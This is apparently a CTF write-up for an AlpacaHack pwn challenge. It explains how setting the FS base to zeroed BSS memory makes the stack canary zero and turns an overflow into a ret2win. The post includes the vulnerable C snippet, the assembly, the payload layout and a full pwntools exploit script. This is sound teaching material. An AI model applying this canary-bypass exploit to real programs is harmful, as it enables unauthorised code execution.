---
title: "fsbase-modification: making the stack canary zero"
date: 2026-10-08 20:00:00 +0600
series: "AlpacaHack Daily"
platform: "AlpacaHack"
summary: "Pointing the FS base at zero-filled BSS turns the stack canary into a known value, and the overflow becomes a plain ret2win."
description: "Pointing the FS base at zero-filled BSS turns the stack canary into a known value, and the overflow becomes a plain ret2win."
tags: ["pwn"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
## The Code

Three functions matter:

| Function | What it does                                           |
| -------- | ------------------------------------------------------ |
| `win()`  | Runs `cat /flag.txt` — never called normally           |
| `vuln()` | 8-byte buffer, reads **32 bytes** → overflow           |
| `main()` | Lets you set the FS base register, then calls `vuln()` |

## Step 1 - Spot the Overflow

```c
char buf[8] = {0};
read(STDIN_FILENO, buf, 32);  // 24 bytes past the end!
```

Stack layout in `vuln()`:
```
[ buf        : 8 bytes ]  ← starts here
[ canary     : 8 bytes ]  ← must survive intact
[ saved rbp  : 8 bytes ]
[ return addr: 8 bytes ]  ← we want win() here
────────────────────────
total: 32 bytes  (exactly what read() allows)
```

With no PIE, `win()` is at a **fixed address** (`0x4011b6`). This looks like a simple ret2win — except there's a **stack canary** in the way.

## Step 2 - The Canary Problem

GCC's stack protector inserts this in every protected function:

```asm
; prologue — save canary onto stack
mov rax, qword ptr fs:0x28   ; read canary from TLS
mov [rbp-0x8], rax            ; store it on the stack

; epilogue — verify it survived
mov rdx, [rbp-0x8]
xor rdx, qword ptr fs:0x28   ; compare with original
jnz __stack_chk_fail          ; mismatch = abort!
```

The canary lives at **`fs:0x28`** — meaning address `(fsbase + 0x28)`. Normally `fsbase` points to glibc's Thread Control Block, where the canary is a **random secret** generated at startup. You can't guess it.

## Step 3 - The FS Base Trick

`main()` hands you the weapon:

```c
unsigned long fsbase = strtoul(buf, NULL, 10);
syscall(SYS_arch_prctl, ARCH_SET_FS, fsbase);  // YOU control where fs points!
```

This lets you redirect `fs` to **any user-space address**. So `fs:0x28` becomes `*(your_address + 0x28)` — a value you choose.

**Goal:** point `fsbase + 0x28` at memory containing **known zeros** → canary = `0`.

## Step 4 - BSS is Always Zero

The **BSS section** holds zero-initialized memory. With no PIE it's at a fixed address: `0x404038`.

```
fsbase = bss_addr - 0x28
       = 0x404038 - 0x28
       = 0x404010  →  send "4210704" (decimal)
```

Now:
```
fs:0x28  →  0x404010 + 0x28  =  0x404038  =  bss_addr  =  0x0000000000000000
```

**Canary = `0`.** Predictable. Controllable. Can be bypassed.

## Step 5 - Build the Payload

```
[ 'A' * 8        ]  fill buf
[ p64(0)         ]  canary = 0  →  epilogue: 0 XOR 0 = 0  ✓
[ p64(0)         ]  saved rbp (don't care)
[ p64(0x4011b6)  ]  return address → win()
──────────────────
32 bytes total
```

## Full Exploit

```python
from pwn import *

elf      = ELF('./chal')
win_addr = elf.symbols['win']   # 0x4011b6
bss_addr = elf.bss()            # 0x404038
fsbase   = bss_addr - 0x28      # 0x404010 = 4210704

p = remote('<host>', 37571)

# Step 1: redirect FS base so canary = 0
p.recvuntil(b'fsbase(-1 for testing a default vuln behavior): ')
p.sendline(str(fsbase).encode())

# Step 2: overflow with known-zero canary
payload  = b'A' * 8
payload += p64(0)           # canary (matches fs:0x28 = 0)
payload += p64(0)           # saved rbp
payload += p64(win_addr)    # return address

p.recvuntil(b'Please leave a message> ')
p.send(payload)

print(p.recvall().decode())
```

## Why `-1` Doesn't Work

Sending `-1` → `strtoul` gives `0xffffffffffffffff` (unsigned wrap) → `arch_prctl` **fails** (kernel address, not allowed) → FS base stays at glibc's real random canary → overflow crashes. That's the "default vuln behavior" the prompt warns about — the bug exists, but you can't exploit it without the fsbase trick.

## Bonus - What the Flag Hints At

`WRFSBASE` is an x86-64 instruction that writes the FS base **directly from userspace** without a syscall:

```asm
wrfsbase rax   ; set fsbase = rax, no kernel involvement
```

Enabled by default on Linux ≥ 5.9. `arch_prctl(ARCH_SET_FS)` internally calls this same instruction. If a binary had a `wrfsbase; ret` gadget in a ROP chain, you'd achieve the exact same canary bypass with no `arch_prctl` needed at all.
{% endraw %}
